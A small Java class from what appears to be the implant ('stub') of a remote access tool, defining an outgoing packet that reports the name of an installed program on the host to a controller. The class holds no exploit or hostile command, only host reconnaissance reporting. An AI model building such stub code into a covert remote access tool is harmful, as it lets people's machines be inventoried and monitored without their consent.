package com.redpois0n.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet55InstalledProgram extends AbstractOutgoingPacket {
	
	private String program;
	
	public Packet55InstalledProgram(String program) {
		this.program = program;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(program);
	}

	@Override
	public byte getPacketId() {
		return 55;
	}

}
